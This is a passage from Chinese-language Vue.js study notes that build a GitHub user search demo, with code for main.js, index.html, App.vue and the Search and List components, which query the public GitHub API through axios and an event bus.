          <img src="https://cn.vuejs.org/images/logo.svg" style='width: 100px'/>
        </a>
        <p class="card-text">xxxxxx</p>
      </div>
      <div class="card">
        <a href="https://github.com/xxxxxx" target="_blank">
          <img src="https://cn.vuejs.org/images/logo.svg" style='width: 100px'/>
        </a>
        <p class="card-text">xxxxxx</p>
      </div>
      <div class="card">
        <a href="https://github.com/xxxxxx" target="_blank">
          <img src="https://cn.vuejs.org/images/logo.svg" style='width: 100px'/>
        </a>
        <p class="card-text">xxxxxx</p>
      </div>
    </div>
  </div>
</div>
</body>
</html>
````





### 效果



![image-20220107213144127](images/image-20220107213144127.png)



## 请求地址



https://api.github.com/search/users?q=????



## main.js



```java
import Vue from 'vue'
import App from './App.vue'
import axios from 'axios'
Vue.config.productionTip = false


new Vue({
    render: h => h(App),
    beforeCreate() {
        Vue.prototype.$bus = this
        Vue.prototype.axios = axios
    }
}).$mount('#app')
```



## index.html



```java
<!DOCTYPE html>
<html lang="">
  <head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width,initial-scale=1.0">
    <link rel="icon" href="<%= BASE_URL %>favicon.ico">
    <link rel="stylesheet" href="<%= BASE_URL %>css/bootstrap.css">
    <title><%= htmlWebpackPlugin.options.title %></title>
  </head>
  <body>
    <noscript>
      <strong>We're sorry but <%= htmlWebpackPlugin.options.title %> doesn't work properly without JavaScript enabled. Please enable it to continue.</strong>
    </noscript>
    <div id="app"></div>
    <!-- built files will be auto injected -->
  </body>
</html>
```



## app.vue



```java
<template>
  <div class="container">
    <Search></Search>
    <List></List>
  </div>
</template>
<script>
import Search from "@/components/github/Search";
import List from "@/components/github/List";
export default {
  name: 'App',
  components:{Search,List},
  data() {
    return {}
  }, methods: {

  }
}
</script>
```



## search.vue



```java
<template>
  <section class="jumbotron">
    <h3 class="jumbotron-heading">Search Github Users</h3>
    <div>
      <input type="text" placeholder="enter the name you search" v-model="message"/>&nbsp;
      <button @click="search">Search</button>
    </div>
  </section>
</template>

<script>
import axios from "axios";

export default {
  name: "Search",
  data() {
    return {
      message: ''
    }
  }, methods: {
    search() {
      axios.get(`https://api.github.com/search/users?q=${this.message}`)
          .then(
              (response) => {
                console.log('请求成功吧',response.data.items)
                this.$bus.$emit('getUsers',response.data.items)
              },
              (error) => {
                console.log('请求失败了',error)
              }
          )
    }

  }
}
</script>

<style scoped>

</style>
```





## list.vue



```java
<template>
  <div class="row">
    <!-- 展示用户列表 -->
    <div  class="card" v-for="user in users" :key="user.id">
      <a :href="user.html_url" target="_blank">
        <img :src="user.avatar_url" style='width: 100px'/>
      </a>
      <p class="card-text">{{user.login}}</p>
    </div>
  </div>
</template>

<script>
export default {
  name: "List",
  data() {
    return {
      users:[]
    }
  },mounted() {
    this.$bus.$on('getUsers',(lists)=>{
      console.log('接收到数据了',lists)
      this.users = lists
    })
  }
}
</script>

<style scoped>
.album {
  min-height: 50rem; /* Can be removed; just added for demo purposes */
  padding-top: 3rem;
  padding-bottom: 3rem;
  background-color: #f7f7f7;
}

.card {
  float: left;
  width: 33.333%;
  padding: .75rem;
  margin-bottom: 2rem;
  border: 1px solid #efefef;
  text-align: center;
}

.card > img {
  margin-bottom: .75rem;
  border-radius: 100px;
}

.card-text {
  font-size: 85%;
}
</style>
```





## 测试





<img src="images/image-20220110095349786.png" alt="image-20220110095349786" style="zoom:80%;" />













